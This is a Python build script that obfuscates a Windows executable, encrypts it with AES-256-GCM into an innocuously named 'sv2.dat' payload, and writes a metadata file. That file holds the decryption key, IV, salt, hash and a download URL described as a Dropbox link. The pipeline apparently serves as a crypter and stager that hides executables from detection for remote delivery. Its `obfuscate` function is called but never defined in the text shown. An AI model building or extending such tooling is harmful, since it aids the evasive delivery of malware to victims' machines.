#!/usr/bin/env python3
"""
Build Pipeline — Obfuscate original.exe, encrypt to sv2.dat, generate metadata.
Flow: original.exe → Xinty obfuscation → AES-256-GCM encryption → sv2.dat
"""

import os
import sys
import json
import base64
import hashlib
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from crypto_utils import PayloadEncryptor, KeyWrapper, IntegrityVerifier


def build(input_exe, output_dir=None, payload_url=None, skip_obfuscation=False):
    if output_dir is None:
        output_dir = os.path.dirname(input_exe)

    base_name = os.path.splitext(os.path.basename(input_exe))[0]
    obfuscated_path = os.path.join(output_dir, f"{base_name}_obfuscated.exe")
    encrypted_path = os.path.join(output_dir, "sv2.dat")
    metadata_path = os.path.join(output_dir, "payload_metadata.json")

    print("=" * 60)
    print("          SECURE PAYLOAD BUILD PIPELINE")
    print("=" * 60)
    print()

    # Step 1: Obfuscate
    if skip_obfuscation:
        print("[*] Skipping obfuscation (--skip-obfuscation)")
        obfuscated_path = input_exe
    else:
        print("[*] Step 1: Obfuscating PE...")
        print()
        obfuscate(input_exe, obfuscated_path, ['all'])
        print()

    # Step 2: Encrypt
    print("[*] Step 2: Encrypting payload with AES-256-GCM...")
    encryptor = PayloadEncryptor()
    metadata = encryptor.encrypt(obfuscated_path, encrypted_path)
    print(f"  [+] Encrypted payload: {encrypted_path}")
    print(f"  [+] Size: {os.path.getsize(encrypted_path)} bytes")
    print(f"  [+] SHA-256: {metadata['sha256']}")
    print()

    # Step 3: Generate metadata
    print("[*] Step 3: Generating metadata...")
    meta_json = {
        'payload_key_b64': base64.b64encode(metadata['payload_key']).decode(),
        'payload_iv_b64': base64.b64encode(metadata['iv']).decode(),
        'payload_salt_b64': base64.b64encode(metadata['salt']).decode(),
        'expected_sha256': metadata['sha256'],
        'payload_url': payload_url or f"file://{os.path.abspath(encrypted_path)}",
        'encrypted_filename': 'sv2.dat',
        'original_filename': os.path.basename(input_exe),
        'payload_size': os.path.getsize(encrypted_path),
    }

    with open(metadata_path, 'w') as f:
        json.dump(meta_json, f, indent=2)
    print(f"  [+] Metadata: {metadata_path}")
    print()

    # Step 4: Verify round-trip
    print("[*] Step 4: Verifying round-trip decryption...")
    verifier = IntegrityVerifier()
    assert verifier.verify(encrypted_path, metadata['sha256']), "Encrypted file hash mismatch!"

    verify_path = os.path.join(output_dir, "_verify_decrypted.tmp")
    ok = encryptor.decrypt(encrypted_path, verify_path,
                           metadata['payload_key'], metadata['iv'], metadata['salt'])
    assert ok, "Decryption failed!"

    orig_hash = verifier.hash_file(obfuscated_path)
    dec_hash = verifier.hash_file(verify_path)
    assert orig_hash == dec_hash, f"Hash mismatch! {orig_hash} != {dec_hash}"
    os.remove(verify_path)
    print(f"  [+] Round-trip verified: decrypted matches obfuscated original")
    print()

    # Step 5: Test key wrapping
    print("[*] Step 5: Testing key wrap/unwrap cycle...")
    wrapper = KeyWrapper()
    test_code = ''.join(__import__('random').choices(
        __import__('string').ascii_letters + __import__('string').digits, k=8))
    wrapped = wrapper.wrap_key(test_code, metadata['payload_key'])
    unwrapped = wrapper.unwrap_key(test_code, wrapped['encrypted_key'],
                                    wrapped['wrapping_iv'], wrapped['wrapping_salt'])
    assert unwrapped == metadata['payload_key'], "Key unwrap mismatch!"
    print(f"  [+] Key wrap/unwrap verified with test code: {test_code}")
    print()

    print("=" * 60)
    print("[✓] Build pipeline completed successfully!")
    print()
    print(f"  Encrypted payload: {encrypted_path}")
    print(f"  Metadata:          {metadata_path}")
    if not skip_obfuscation:
        print(f"  Obfuscated exe:    {obfuscated_path}")
    print("=" * 60)

    return encrypted_path, metadata_path


def main():
    parser = argparse.ArgumentParser(description='Secure Payload Build Pipeline')
    parser.add_argument('input', help='Input PE executable (e.g. original.exe)')
    parser.add_argument('--output-dir', '-o', help='Output directory')
    parser.add_argument('--payload-url', help='Dropbox URL for payload download')
    parser.add_argument('--skip-obfuscation', action='store_true',
                        help='Skip PE obfuscation step')
    args = parser.parse_args()

    build(args.input, args.output_dir, args.payload_url, args.skip_obfuscation)


if __name__ == '__main__':
    main()
